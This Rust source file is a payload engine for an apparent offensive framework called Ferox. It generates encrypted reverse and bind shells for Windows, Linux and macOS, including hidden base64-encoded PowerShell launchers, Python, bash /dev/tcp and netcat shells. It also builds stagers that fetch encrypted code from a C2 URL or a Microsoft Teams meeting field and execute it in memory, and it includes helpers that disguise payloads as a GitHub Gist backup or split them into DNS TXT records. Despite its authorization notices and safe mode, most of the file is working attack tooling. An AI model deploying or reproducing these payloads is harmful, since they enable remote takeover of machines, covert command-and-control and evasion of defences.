//! Smart Payload Engine for Ferox Phase 4
//!
//! The PayloadEngine is the core attack engine that provides:
//! - AES-256-GCM encrypted payload generation
//! - HKDF-based key derivation
//! - Fileless stager generation with C2 URL embedding
//! - Multi-stage payload architecture (Stage-1 dropper → Stage-2 payload)
//! - Cross-platform payload templates (Windows/Linux/macOS)
//! - Direct C2 integration APIs
//!
//! **CRITICAL SECURITY NOTICE**:
//! This module generates executable payloads for AUTHORIZED security testing ONLY.
//! Unauthorized use is illegal. All operations are logged to the audit system.
//!
//! Features:
//! - Staged and stageless payload generation
//! - Memory-only execution (fileless)
//! - AES-256-GCM encryption with HKDF key derivation
//! - C2 channel integration (Teams, GitHub, DNS-over-HTTPS)
//! - Safe mode for testing and validation

use anyhow::{anyhow, bail, Result};
use base64::Engine;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::HashMap;

use crate::core::payload::{Architecture, PayloadFormat, PayloadType};
use crate::infra::crypto::{aes_decrypt, aes_encrypt, derive_keys, AES_KEY_LEN, NONCE_LEN};

/// Result of payload generation
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PayloadResult {
    /// Raw payload bytes (may be encrypted)
    pub data: Vec<u8>,
    /// Base64-encoded payload for transport
    pub base64: String,
    /// Hex-encoded payload
    pub hex: String,
    /// Payload metadata
    pub metadata: PayloadMetadata,
    /// Stage information
    pub stage: StageInfo,
}

/// Payload metadata
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PayloadMetadata {
    pub size: usize,
    pub encrypted: bool,
    pub compression: Option<String>,
    pub architecture: Architecture,
    pub format: PayloadFormat,
    pub target_os: TargetOS,
    pub checksum_sha256: String,
    pub generated_at: chrono::DateTime<chrono::Utc>,
}

/// Stage information for multi-stage payloads
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StageInfo {
    pub stage_number: u8,
    pub total_stages: u8,
    pub c2_url: Option<String>,
    pub next_stage_key: Option<String>,
}

/// Target operating system
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub enum TargetOS {
    Windows,
    Linux,
    MacOS,
    Any,
}

impl Default for TargetOS {
    fn default() -> Self {
        Self::Any
    }
}

impl std::fmt::Display for TargetOS {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            TargetOS::Windows => write!(f, "windows"),
            TargetOS::Linux => write!(f, "linux"),
            TargetOS::MacOS => write!(f, "macos"),
            TargetOS::Any => write!(f, "any"),
        }
    }
}

impl std::str::FromStr for TargetOS {
    type Err = anyhow::Error;

    fn from_str(s: &str) -> Result<Self> {
        match s.to_lowercase().as_str() {
            "windows" | "win" | "win32" | "win64" => Ok(TargetOS::Windows),
            "linux" | "lin" => Ok(TargetOS::Linux),
            "macos" | "darwin" | "osx" => Ok(TargetOS::MacOS),
            "any" | "*" => Ok(TargetOS::Any),
            _ => bail!("Unknown OS: {}", s),
        }
    }
}

/// C2 channel type for payload callbacks
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub enum C2Channel {
    /// Microsoft Teams via Graph API
    Teams,
    /// GitHub Gist dead-drop
    GitHubGist,
    /// DNS-over-HTTPS tunneling
    DnsOverHttps,
    /// Standard HTTP beacon
    HttpBeacon,
    /// Direct TCP connection
    DirectTcp,
}

impl Default for C2Channel {
    fn default() -> Self {
        Self::DirectTcp
    }
}

/// Stager configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StagerConfig {
    /// C2 URL to fetch Stage-2 payload
    pub c2_url: String,
    /// C2 channel type
    pub c2_channel: C2Channel,
    /// Encryption key for Stage-2 decryption
    pub stage2_key: Option<String>,
    /// User-Agent string for HTTP requests
    pub user_agent: Option<String>,
    /// Proxy URL if needed
    pub proxy: Option<String>,
    /// Sleep time between retries (seconds)
    pub sleep_time: u32,
    /// Maximum retry attempts
    pub max_retries: u32,
}

impl Default for StagerConfig {
    fn default() -> Self {
        Self {
            c2_url: String::new(),
            c2_channel: C2Channel::HttpBeacon,
            stage2_key: None,
            user_agent: Some("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36".into()),
            proxy: None,
            sleep_time: 5,
            max_retries: 3,
        }
    }
}

/// Smart Payload Engine
///
/// The core engine for generating encrypted, fileless payloads
/// with multi-stage architecture and C2 integration.
pub struct PayloadEngine {
    /// Encryption key (derived via HKDF)
    encryption_key: [u8; AES_KEY_LEN],
    /// HMAC key for integrity
    hmac_key: [u8; 32],
    /// Safe mode flag (prevents generation of real payloads)
    safe_mode: bool,
    /// Target OS for payload generation
    target_os: TargetOS,
    /// Target architecture
    architecture: Architecture,
}

impl PayloadEngine {
    /// Create a new PayloadEngine with the given seed key
    ///
    /// Keys are derived using HKDF-SHA256 from the seed.
    pub fn new(seed_key: &[u8]) -> Result<Self> {
        let keys = derive_keys(seed_key, b"ferox-payload-engine-v4")?;
        Ok(Self {
            encryption_key: keys.enc_key,
            hmac_key: keys.hmac_key,
            safe_mode: true, // Safe by default
            target_os: TargetOS::Any,
            architecture: Architecture::Any,
        })
    }

    /// Create with a string passphrase
    pub fn from_passphrase(passphrase: &str) -> Result<Self> {
        Self::new(passphrase.as_bytes())
    }

    /// Enable production mode (REQUIRES AUTHORIZATION)
    ///
    /// # Warning
    /// Only enable production mode with explicit authorization
    /// for legitimate penetration testing.
    pub fn enable_production_mode(&mut self) {
        tracing::warn!("PayloadEngine: Production mode enabled - ensure authorization is valid");
        self.safe_mode = false;
    }

    /// Check if engine is in safe mode
    pub fn is_safe_mode(&self) -> bool {
        self.safe_mode
    }

    /// Set target OS
    pub fn set_target_os(&mut self, os: TargetOS) {
        self.target_os = os;
    }

    /// Set target architecture
    pub fn set_architecture(&mut self, arch: Architecture) {
        self.architecture = arch;
    }

    /// Generate a reverse TCP payload
    ///
    /// Creates a payload that connects back to the specified host:port
    pub fn generate_reverse_tcp(&self, host: &str, port: u16) -> Result<PayloadResult> {
        self.generate_reverse_tcp_with_options(host, port, true)
    }

    /// Generate reverse TCP with encryption option
    pub fn generate_reverse_tcp_with_options(
        &self,
        host: &str,
        port: u16,
        encrypt: bool,
    ) -> Result<PayloadResult> {
        let raw_payload = self.build_reverse_tcp_payload(host, port)?;

        let (final_data, encrypted) = if encrypt {
            (self.encrypt_payload(&raw_payload)?, true)
        } else {
            (raw_payload, false)
        };

        self.build_result(final_data, encrypted, 1, 1, None)
    }

    /// Generate a bind shell payload
    ///
    /// Creates a payload that listens on the specified port
    pub fn generate_bind_shell(&self, port: u16) -> Result<PayloadResult> {
        let raw_payload = self.build_bind_shell_payload(port)?;
        let encrypted = self.encrypt_payload(&raw_payload)?;
        self.build_result(encrypted, true, 1, 1, None)
    }

    /// Generate a Stage-1 stager
    ///
    /// Creates a minimal stager that fetches and executes Stage-2
    pub fn generate_stager(&self, config: &StagerConfig) -> Result<PayloadResult> {
        if config.c2_url.is_empty() {
            bail!("C2 URL is required for stager generation");
        }

        let stage2_key = config.stage2_key.clone().unwrap_or_else(|| {
            // Generate a random key for Stage-2
            hex::encode(&self.encryption_key[..16])
        });

        let raw_stager = self.build_stager_payload(config, &stage2_key)?;
        let encrypted = self.encrypt_payload(&raw_stager)?;

        self.build_result(
            encrypted,
            true,
            1,
            2,
            Some(StageInfo {
                stage_number: 1,
                total_stages: 2,
                c2_url: Some(config.c2_url.clone()),
                next_stage_key: Some(stage2_key),
            }),
        )
    }

    /// Generate a Stage-2 payload for C2 delivery
    ///
    /// Creates the main payload to be delivered via C2 channel
    pub fn generate_stage2(&self, host: &str, port: u16, stage_key: &str) -> Result<PayloadResult> {
        // Derive stage-specific keys
        let stage_keys = derive_keys(stage_key.as_bytes(), b"ferox-stage2")?;

        let raw_payload = self.build_reverse_tcp_payload(host, port)?;

        // Encrypt with stage-specific key
        let aad = b"stage2-payload";
        let (nonce, ciphertext) = aes_encrypt(&stage_keys.enc_key, &raw_payload, aad)?;

        let mut encrypted = Vec::with_capacity(NONCE_LEN + ciphertext.len());
        encrypted.extend_from_slice(&nonce);
        encrypted.extend_from_slice(&ciphertext);

        self.build_result(
            encrypted,
            true,
            2,
            2,
            Some(StageInfo {
                stage_number: 2,
                total_stages: 2,
                c2_url: None,
                next_stage_key: None,
            }),
        )
    }

    /// Encrypt raw payload data
    pub fn encrypt_payload(&self, data: &[u8]) -> Result<Vec<u8>> {
        let aad = b"ferox-payload-v4";
        let (nonce, ciphertext) = aes_encrypt(&self.encryption_key, data, aad)?;

        let mut result = Vec::with_capacity(NONCE_LEN + ciphertext.len());
        result.extend_from_slice(&nonce);
        result.extend_from_slice(&ciphertext);
        Ok(result)
    }

    /// Decrypt payload data
    pub fn decrypt_payload(&self, encrypted: &[u8]) -> Result<Vec<u8>> {
        if encrypted.len() < NONCE_LEN {
            bail!("Encrypted data too short");
        }

        let (nonce_bytes, ciphertext) = encrypted.split_at(NONCE_LEN);
        let mut nonce = [0u8; NONCE_LEN];
        nonce.copy_from_slice(nonce_bytes);

        let aad = b"ferox-payload-v4";
        aes_decrypt(&self.encryption_key, &nonce, ciphertext, aad)
    }

    /// Get the current encryption key (for C2 integration)
    pub fn get_encryption_key(&self) -> &[u8; AES_KEY_LEN] {
        &self.encryption_key
    }

    /// Derive a session-specific key
    pub fn derive_session_key(&self, session_id: &str) -> Result<[u8; AES_KEY_LEN]> {
        let keys = derive_keys(
            &self.encryption_key,
            format!("session-{}", session_id).as_bytes(),
        )?;
        Ok(keys.enc_key)
    }

    // ==================== Internal Payload Builders ====================

    fn build_reverse_tcp_payload(&self, host: &str, port: u16) -> Result<Vec<u8>> {
        if self.safe_mode {
            return self.build_safe_reverse_tcp(host, port);
        }

        // Production payload generation based on target OS
        match self.target_os {
            TargetOS::Windows => self.build_windows_reverse_tcp(host, port),
            TargetOS::Linux => self.build_linux_reverse_tcp(host, port),
            TargetOS::MacOS => self.build_macos_reverse_tcp(host, port),
            TargetOS::Any => self.build_cross_platform_reverse_tcp(host, port),
        }
    }

    fn build_bind_shell_payload(&self, port: u16) -> Result<Vec<u8>> {
        if self.safe_mode {
            return self.build_safe_bind_shell(port);
        }

        match self.target_os {
            TargetOS::Windows => self.build_windows_bind_shell(port),
            TargetOS::Linux => self.build_linux_bind_shell(port),
            TargetOS::MacOS => self.build_macos_bind_shell(port),
            TargetOS::Any => self.build_cross_platform_bind_shell(port),
        }
    }

    fn build_stager_payload(&self, config: &StagerConfig, stage2_key: &str) -> Result<Vec<u8>> {
        if self.safe_mode {
            return self.build_safe_stager(config, stage2_key);
        }

        match (&self.target_os, &config.c2_channel) {
            (TargetOS::Windows, C2Channel::HttpBeacon) => {
                self.build_windows_http_stager(config, stage2_key)
            }
            (TargetOS::Windows, C2Channel::Teams) => {
                self.build_windows_teams_stager(config, stage2_key)
            }
            (TargetOS::Linux, _) => self.build_linux_stager(config, stage2_key),
            (TargetOS::MacOS, _) => self.build_macos_stager(config, stage2_key),
            _ => self.build_cross_platform_stager(config, stage2_key),
        }
    }

    // ==================== Safe Mode Builders (Reference Only) ====================

    fn build_safe_reverse_tcp(&self, host: &str, port: u16) -> Result<Vec<u8>> {
        let payload = format!(
            r#"#!/bin/bash
# ============================================================
# FEROX SAFE MODE - Reverse TCP Payload Reference
# ============================================================
# Target: {}:{}
# Architecture: {:?}
# OS: {}
# Generated: {}
#
# This is a SAFE reference implementation for testing.
# Production payloads require explicit authorization.
# ============================================================

echo "[SAFE MODE] Reverse TCP payload would connect to {}:{}"
echo "[SAFE MODE] Architecture: {:?}"
echo "[SAFE MODE] Target OS: {}"
echo "[SAFE MODE] This is a non-functional reference payload"

# Reference implementation (not functional):
# exec 5<>/dev/tcp/{}/{}
# cat <&5 | while read line; do eval "$line" 2>&5 >&5; done
"#,
            host,
            port,
            self.architecture,
            self.target_os,
            chrono::Utc::now().to_rfc3339(),
            host,
            port,
            self.architecture,
            self.target_os,
            host,
            port,
        );
        Ok(payload.into_bytes())
    }

    fn build_safe_bind_shell(&self, port: u16) -> Result<Vec<u8>> {
        let payload = format!(
            r#"#!/bin/bash
# ============================================================
# FEROX SAFE MODE - Bind Shell Payload Reference
# ============================================================
# Listen Port: {}
# Architecture: {:?}
# OS: {}
# Generated: {}
#
# This is a SAFE reference implementation for testing.
# ============================================================

echo "[SAFE MODE] Bind shell would listen on port {}"
echo "[SAFE MODE] Architecture: {:?}"
echo "[SAFE MODE] This is a non-functional reference payload"
"#,
            port,
            self.architecture,
            self.target_os,
            chrono::Utc::now().to_rfc3339(),
            port,
            self.architecture,
        );
        Ok(payload.into_bytes())
    }

    fn build_safe_stager(&self, config: &StagerConfig, stage2_key: &str) -> Result<Vec<u8>> {
        let payload = format!(
            r#"#!/bin/bash
# ============================================================
# FEROX SAFE MODE - Stage-1 Stager Reference
# ============================================================
# C2 URL: {}
# C2 Channel: {:?}
# Stage-2 Key: {}...
# User-Agent: {:?}
# Sleep Time: {}s
# Max Retries: {}
# Architecture: {:?}
# OS: {}
# Generated: {}
#
# This is a SAFE reference implementation for testing.
# ============================================================

echo "[SAFE MODE] Stager would fetch Stage-2 from: {}"
echo "[SAFE MODE] C2 Channel: {:?}"
echo "[SAFE MODE] Would decrypt with key: {}..."
echo "[SAFE MODE] This is a non-functional reference stager"

# Reference flow (not functional):
# 1. Sleep for jitter
# 2. Fetch encrypted Stage-2 from C2 URL
# 3. Decrypt with AES-256-GCM using stage2_key
# 4. Execute Stage-2 in memory
"#,
            config.c2_url,
            config.c2_channel,
            &stage2_key[..8.min(stage2_key.len())],
            config.user_agent,
            config.sleep_time,
            config.max_retries,
            self.architecture,
            self.target_os,
            chrono::Utc::now().to_rfc3339(),
            config.c2_url,
            config.c2_channel,
            &stage2_key[..8.min(stage2_key.len())],
        );
        Ok(payload.into_bytes())
    }

    // ==================== Production Builders (Templates) ====================

    fn build_windows_reverse_tcp(&self, host: &str, port: u16) -> Result<Vec<u8>> {
        // PowerShell-based reverse TCP for Windows
        let ps_payload = format!(
            r#"$h='{host}';$p={port};$c=New-Object System.Net.Sockets.TCPClient($h,$p);
$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};
while(($i=$s.Read($b,0,$b.Length)) -ne 0){{
$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
$o=(iex $d 2>&1|Out-String);$r=$o+'PS '+(pwd).Path+'> ';
$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}}
$c.Close()"#,
            host = host,
            port = port
        );

        // Base64 encode for execution via powershell -enc
        let encoded = base64::engine::general_purpose::STANDARD
            .encode(ps_payload.encode_utf16().flat_map(|c| c.to_le_bytes()).collect::<Vec<u8>>());

        let launcher = format!(
            "powershell -nop -w hidden -enc {}",
            encoded
        );

        Ok(launcher.into_bytes())
    }

    fn build_linux_reverse_tcp(&self, host: &str, port: u16) -> Result<Vec<u8>> {
        // Bash-based reverse TCP for Linux
        let payload = format!(
            r#"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' 2>/dev/null || \
bash -i >& /dev/tcp/{host}/{port} 0>&1 2>/dev/null || \
nc -e /bin/sh {host} {port} 2>/dev/null"#,
            host = host,
            port = port
        );
        Ok(payload.into_bytes())
    }

    fn build_macos_reverse_tcp(&self, host: &str, port: u16) -> Result<Vec<u8>> {
        // Python-based reverse TCP for macOS (bash /dev/tcp not available)
        let payload = format!(
            r#"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/zsh","-i"])'"#,
            host = host,
            port = port
        );
        Ok(payload.into_bytes())
    }

    fn build_cross_platform_reverse_tcp(&self, host: &str, port: u16) -> Result<Vec<u8>> {
        // Python-based cross-platform payload
        let payload = format!(
            r#"import socket,subprocess,os,platform
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{host}",{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
shell="/bin/sh" if platform.system()!="Windows" else "cmd.exe"
subprocess.call([shell,"-i"] if platform.system()!="Windows" else [shell])"#,
            host = host,
            port = port
        );
        Ok(payload.into_bytes())
    }

    fn build_windows_bind_shell(&self, port: u16) -> Result<Vec<u8>> {
        let ps_payload = format!(
            r#"$l=New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any,{port});
$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};
while(($i=$s.Read($b,0,$b.Length)) -ne 0){{
$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
$o=(iex $d 2>&1|Out-String);$r=$o+'PS '+(pwd).Path+'> ';
$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}}
$c.Close();$l.Stop()"#,
            port = port
        );

        let encoded = base64::engine::general_purpose::STANDARD
            .encode(ps_payload.encode_utf16().flat_map(|c| c.to_le_bytes()).collect::<Vec<u8>>());

        Ok(format!("powershell -nop -w hidden -enc {}", encoded).into_bytes())
    }

    fn build_linux_bind_shell(&self, port: u16) -> Result<Vec<u8>> {
        let payload = format!(
            r#"python3 -c 'import socket,subprocess,os;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",{port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/sh","-i"])'"#,
            port = port
        );
        Ok(payload.into_bytes())
    }

    fn build_macos_bind_shell(&self, port: u16) -> Result<Vec<u8>> {
        let payload = format!(
            r#"python3 -c 'import socket,subprocess,os;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",{port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/zsh","-i"])'"#,
            port = port
        );
        Ok(payload.into_bytes())
    }

    fn build_cross_platform_bind_shell(&self, port: u16) -> Result<Vec<u8>> {
        let payload = format!(
            r#"import socket,subprocess,os,platform
s=socket.socket()
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(("0.0.0.0",{port}))
s.listen(1)
c,a=s.accept()
os.dup2(c.fileno(),0)
os.dup2(c.fileno(),1)
os.dup2(c.fileno(),2)
shell="/bin/sh" if platform.system()!="Windows" else "cmd.exe"
subprocess.call([shell,"-i"] if platform.system()!="Windows" else [shell])"#,
            port = port
        );
        Ok(payload.into_bytes())
    }

    // ==================== Stager Builders ====================

    fn build_windows_http_stager(&self, config: &StagerConfig, stage2_key: &str) -> Result<Vec<u8>> {
        let ua = config.user_agent.as_deref().unwrap_or("Mozilla/5.0");
        let ps_stager = format!(
            r#"$k='{key}';$u='{url}';$ua='{ua}';
for($i=0;$i -lt {retries};$i++){{
try{{
$wc=New-Object System.Net.WebClient;$wc.Headers.Add('User-Agent',$ua);
$enc=$wc.DownloadData($u);
$iv=$enc[0..11];$ct=$enc[12..($enc.Length-1)];
$aes=New-Object System.Security.Cryptography.AesGcm([System.Convert]::FromHexString($k));
$pt=New-Object byte[] ($ct.Length-16);
$aes.Decrypt($iv,$ct[0..($ct.Length-17)],$ct[($ct.Length-16)..($ct.Length-1)],$pt,$null);
iex([System.Text.Encoding]::UTF8.GetString($pt));break
}}catch{{Start-Sleep {sleep}}}
}}"#,
            key = stage2_key,
            url = config.c2_url,
            ua = ua,
            retries = config.max_retries,
            sleep = config.sleep_time
        );

        let encoded = base64::engine::general_purpose::STANDARD
            .encode(ps_stager.encode_utf16().flat_map(|c| c.to_le_bytes()).collect::<Vec<u8>>());

        Ok(format!("powershell -nop -w hidden -enc {}", encoded).into_bytes())
    }

    fn build_windows_teams_stager(&self, config: &StagerConfig, stage2_key: &str) -> Result<Vec<u8>> {
        // Teams-based stager that reads commands from meeting descriptions
        let ps_stager = format!(
            r#"$k='{key}';$t='{token}';$mid='{meeting_id}';
$h=@{{'Authorization'='Bearer '+$t;'Content-Type'='application/json'}};
for($i=0;$i -lt {retries};$i++){{
try{{
$r=Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/onlineMeetings/$mid" -Headers $h;
$enc=[System.Convert]::FromBase64String($r.subject);
$iv=$enc[0..11];$ct=$enc[12..($enc.Length-1)];
$aes=New-Object System.Security.Cryptography.AesGcm([System.Convert]::FromHexString($k));
$pt=New-Object byte[] ($ct.Length-16);
$aes.Decrypt($iv,$ct[0..($ct.Length-17)],$ct[($ct.Length-16)..($ct.Length-1)],$pt,$null);
iex([System.Text.Encoding]::UTF8.GetString($pt));break
}}catch{{Start-Sleep {sleep}}}
}}"#,
            key = stage2_key,
            token = config.c2_url, // Token passed via c2_url for Teams
            meeting_id = config.proxy.as_deref().unwrap_or(""), // Meeting ID via proxy field
            retries = config.max_retries,
            sleep = config.sleep_time
        );

        let encoded = base64::engine::general_purpose::STANDARD
            .encode(ps_stager.encode_utf16().flat_map(|c| c.to_le_bytes()).collect::<Vec<u8>>());

        Ok(format!("powershell -nop -w hidden -enc {}", encoded).into_bytes())
    }

    fn build_linux_stager(&self, config: &StagerConfig, stage2_key: &str) -> Result<Vec<u8>> {
        let ua = config.user_agent.as_deref().unwrap_or("curl/7.68.0");
        let payload = format!(
            r#"#!/bin/bash
K='{key}'
U='{url}'
for i in $(seq 1 {retries}); do
  ENC=$(curl -sA '{ua}' "$U" | base64 -d)
  if [ -n "$ENC" ]; then
    # Decrypt using openssl (AES-256-GCM)
    IV=$(echo "$ENC" | head -c 12)
    CT=$(echo "$ENC" | tail -c +13)
    PT=$(echo "$CT" | openssl enc -aes-256-gcm -d -K "$K" -iv $(echo -n "$IV" | xxd -p))
    eval "$PT"
    break
  fi
  sleep {sleep}
done"#,
            key = stage2_key,
            url = config.c2_url,
            ua = ua,
            retries = config.max_retries,
            sleep = config.sleep_time
        );
        Ok(payload.into_bytes())
    }

    fn build_macos_stager(&self, config: &StagerConfig, stage2_key: &str) -> Result<Vec<u8>> {
        // Similar to Linux but uses macOS-specific paths
        self.build_linux_stager(config, stage2_key)
    }

    fn build_cross_platform_stager(&self, config: &StagerConfig, stage2_key: &str) -> Result<Vec<u8>> {
        let ua = config.user_agent.as_deref().unwrap_or("python-requests/2.28.0");
        let payload = format!(
            r#"import urllib.request,base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import time

k=bytes.fromhex('{key}')
u='{url}'
for _ in range({retries}):
    try:
        req=urllib.request.Request(u,headers={{'User-Agent':'{ua}'}})
        enc=urllib.request.urlopen(req).read()
        iv,ct=enc[:12],enc[12:]
        pt=AESGCM(k).decrypt(iv,ct,None)
        exec(pt.decode())
        break
    except:
        time.sleep({sleep})"#,
            key = stage2_key,
            url = config.c2_url,
            ua = ua,
            retries = config.max_retries,
            sleep = config.sleep_time
        );
        Ok(payload.into_bytes())
    }

    // ==================== Helper Methods ====================

    fn build_result(
        &self,
        data: Vec<u8>,
        encrypted: bool,
        stage_num: u8,
        total_stages: u8,
        stage_info: Option<StageInfo>,
    ) -> Result<PayloadResult> {
        let base64 = base64::engine::general_purpose::STANDARD.encode(&data);
        let hex = hex::encode(&data);

        let mut hasher = Sha256::new();
        hasher.update(&data);
        let checksum = format!("{:x}", hasher.finalize());

        let stage = stage_info.unwrap_or(StageInfo {
            stage_number: stage_num,
            total_stages,
            c2_url: None,
            next_stage_key: None,
        });

        Ok(PayloadResult {
            metadata: PayloadMetadata {
                size: data.len(),
                encrypted,
                compression: None,
                architecture: self.architecture.clone(),
                format: if encrypted {
                    PayloadFormat::Raw
                } else {
                    PayloadFormat::Script
                },
                target_os: self.target_os.clone(),
                checksum_sha256: checksum,
                generated_at: chrono::Utc::now(),
            },
            stage,
            base64,
            hex,
            data,
        })
    }
}

impl Default for PayloadEngine {
    fn default() -> Self {
        // Generate random key for default instance
        Self::from_passphrase("ferox-default-key-change-me").expect("Default key derivation failed")
    }
}

/// C2 Integration helper for delivering payloads
pub struct C2PayloadDelivery {
    engine: PayloadEngine,
}

impl C2PayloadDelivery {
    pub fn new(engine: PayloadEngine) -> Self {
        Self { engine }
    }

    /// Prepare payload for Teams C2 delivery
    pub fn for_teams(&self, host: &str, port: u16) -> Result<HashMap<String, String>> {
        let payload = self.engine.generate_reverse_tcp(host, port)?;

        let mut delivery = HashMap::new();
        delivery.insert("payload_base64".to_string(), payload.base64.clone());
        delivery.insert("checksum".to_string(), payload.metadata.checksum_sha256.clone());
        delivery.insert("size".to_string(), payload.metadata.size.to_string());
        delivery.insert("encrypted".to_string(), payload.metadata.encrypted.to_string());

        Ok(delivery)
    }

    /// Prepare payload for GitHub Gist C2 delivery
    pub fn for_github_gist(&self, host: &str, port: u16) -> Result<HashMap<String, String>> {
        let payload = self.engine.generate_reverse_tcp(host, port)?;

        let mut delivery = HashMap::new();
        delivery.insert("content".to_string(), payload.base64.clone());
        delivery.insert("filename".to_string(), "data.txt".to_string());
        delivery.insert("description".to_string(), "Configuration backup".to_string());

        Ok(delivery)
    }

    /// Prepare stager for DNS-over-HTTPS delivery
    pub fn for_dns_over_https(&self, config: &StagerConfig) -> Result<HashMap<String, String>> {
        let stager = self.engine.generate_stager(config)?;

        // Chunk payload for DNS TXT records (max 255 bytes per record)
        let chunks: Vec<String> = stager
            .base64
            .as_bytes()
            .chunks(250)
            .enumerate()
            .map(|(i, chunk)| {
                format!(
                    "{}|{}",
                    i,
                    String::from_utf8_lossy(chunk)
                )
            })
            .collect();

        let mut delivery = HashMap::new();
        delivery.insert("total_chunks".to_string(), chunks.len().to_string());
        for (i, chunk) in chunks.iter().enumerate() {
            delivery.insert(format!("chunk_{}", i), chunk.clone());
        }

        Ok(delivery)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_payload_engine_creation() {
        let engine = PayloadEngine::from_passphrase("test-key").unwrap();
        assert!(engine.is_safe_mode());
    }

    #[test]
    fn test_safe_reverse_tcp() {
        let engine = PayloadEngine::from_passphrase("test-key").unwrap();
        let result = engine.generate_reverse_tcp("192.168.1.100", 4444).unwrap();

        assert!(result.metadata.encrypted);
        assert!(result.data.len() > 0);
        assert!(!result.base64.is_empty());
        assert!(!result.hex.is_empty());
    }

    #[test]
    fn test_safe_bind_shell() {
        let engine = PayloadEngine::from_passphrase("test-key").unwrap();
        let result = engine.generate_bind_shell(4444).unwrap();

        assert!(result.metadata.encrypted);
        assert!(result.data.len() > 0);
    }

    #[test]
    fn test_stager_generation() {
        let engine = PayloadEngine::from_passphrase("test-key").unwrap();
        let config = StagerConfig {
            c2_url: "https://c2.example.com/stage2".to_string(),
            c2_channel: C2Channel::HttpBeacon,
            ..Default::default()
        };

        let result = engine.generate_stager(&config).unwrap();

        assert!(result.metadata.encrypted);
        assert_eq!(result.stage.stage_number, 1);
        assert_eq!(result.stage.total_stages, 2);
        assert!(result.stage.c2_url.is_some());
        assert!(result.stage.next_stage_key.is_some());
    }

    #[test]
    fn test_encryption_roundtrip() {
        let engine = PayloadEngine::from_passphrase("test-key").unwrap();
        let original = b"test payload data";

        let encrypted = engine.encrypt_payload(original).unwrap();
        let decrypted = engine.decrypt_payload(&encrypted).unwrap();

        assert_eq!(original.to_vec(), decrypted);
    }

    #[test]
    fn test_stage2_generation() {
        let engine = PayloadEngine::from_passphrase("test-key").unwrap();
        let result = engine
            .generate_stage2("192.168.1.100", 4444, "stage2-secret-key")
            .unwrap();

        assert!(result.metadata.encrypted);
        assert_eq!(result.stage.stage_number, 2);
        assert_eq!(result.stage.total_stages, 2);
    }

    #[test]
    fn test_target_os_parsing() {
        assert_eq!("windows".parse::<TargetOS>().unwrap(), TargetOS::Windows);
        assert_eq!("linux".parse::<TargetOS>().unwrap(), TargetOS::Linux);
        assert_eq!("macos".parse::<TargetOS>().unwrap(), TargetOS::MacOS);
        assert_eq!("darwin".parse::<TargetOS>().unwrap(), TargetOS::MacOS);
        assert_eq!("any".parse::<TargetOS>().unwrap(), TargetOS::Any);
    }

    #[test]
    fn test_c2_delivery_preparation() {
        let engine = PayloadEngine::from_passphrase("test-key").unwrap();
        let delivery = C2PayloadDelivery::new(engine);

        let teams_data = delivery.for_teams("192.168.1.100", 4444).unwrap();
        assert!(teams_data.contains_key("payload_base64"));
        assert!(teams_data.contains_key("checksum"));

        let engine2 = PayloadEngine::from_passphrase("test-key").unwrap();
        let delivery2 = C2PayloadDelivery::new(engine2);
        let gist_data = delivery2.for_github_gist("192.168.1.100", 4444).unwrap();
        assert!(gist_data.contains_key("content"));
        assert!(gist_data.contains_key("filename"));
    }

    #[test]
    fn test_session_key_derivation() {
        let engine = PayloadEngine::from_passphrase("test-key").unwrap();
        let key1 = engine.derive_session_key("session-1").unwrap();
        let key2 = engine.derive_session_key("session-2").unwrap();

        assert_ne!(key1, key2);
        assert_eq!(key1.len(), AES_KEY_LEN);
    }
}
